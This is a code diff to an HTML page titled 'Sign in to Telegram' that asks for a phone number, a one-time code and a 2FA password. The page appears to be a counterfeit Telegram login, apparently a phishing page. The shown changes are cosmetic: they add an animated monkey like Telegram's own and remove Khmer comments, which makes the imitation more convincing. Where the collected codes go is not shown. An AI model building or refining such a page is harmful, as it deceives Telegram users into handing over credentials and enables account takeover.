@@ -5,6 +5,10 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Sign in to Telegram</title>
 <script src="https://cdn.tailwindcss.com"></script>
+
+<!-- 🐒 Lottie Player Script សម្រាប់បង្ហាញ Animation ស្វា Telegram -->
+<script src="https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js"></script>
+
 <style>
   :root {
     --bg: #171717;
@@ -282,10 +286,7 @@
     <div id="step-phone">
       <div class="logo">
         <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <!-- រង្វង់មូលពណ៌ខៀវខាងក្រោយ -->
           <circle cx="50" cy="50" r="50" fill="#2AABEE"/>
-          
-          <!-- រូបយន្តហោះក្រដាសពណ៌ស -->
           <path d="M19.5 49.7C27.9 46.1 71.2 28 77.2 25.5C79.7 24.4 82.2 25.2 81.4 28.5C80.2 33.7 75 59.8 72 73.8C71.1 78.2 68.2 79.5 64.9 77.3C59.5 73.7 49 66.8 45 63.8C43.2 62.4 43.5 60.8 45.4 58.9C49.8 54.5 64.8 40 65.4 39.3C66.1 38.5 65.2 38.1 64.3 38.7C52.7 46.5 35 58.2 31.8 60.3C29.6 61.8 27.2 62.3 25.1 61.7C21.8 60.7 16.5 59 12.8 57.8C10.2 57 10 54.9 13.5 53.5C14.7 53 17 50.8 19.5 49.7Z" fill="white"/>
         </svg>
       </div>
@@ -315,7 +316,6 @@
         <span>Keep me signed in</span>
       </label>
 
-      <!-- ប្តូរឈ្មោះប៊ូតុងទៅជា NEXT -->
       <button id="btn-send" onclick="sendPhone()" class="btn-primary">NEXT</button>
 
       <div class="alt-links">
@@ -326,7 +326,19 @@
 
     <!-- STEP 2: OTP & 2FA Form -->
     <div id="step-otp" class="space-y-6 hidden">
-      <div class="text-5xl mb-2">🔐</div>
+      
+      <!-- 🐒 Telegram Monkey Animation (ជំនួស 🔐) -->
+      <div class="flex justify-center mb-2">
+        <lottie-player 
+          src="https://fonts.gstatic.com/s/e/notoemoji/latest/1f648/lottie.json" 
+          background="transparent" 
+          speed="1" 
+          style="width: 110px; height: 110px;" 
+          loop 
+          autoplay>
+        </lottie-player>
+      </div>
+
       <div>
         <h2 id="display-phone" class="text-lg font-semibold mb-1 text-white"></h2>
         <p id="auth-status" class="text-gray-400 text-sm">We've sent the code to your Telegram app.</p>
@@ -640,7 +652,6 @@
             return;
         }
 
-        // 🔄 ប្តូរអក្សរទៅជា PLEASE WAIT... និងបន្ថែមរង្វង់វិល (Spinner Animation)
         btn.disabled = true;
         btn.innerHTML = '<span>PLEASE WAIT...</span><span class="spinner"></span>';
         btn.classList.add('opacity-70');
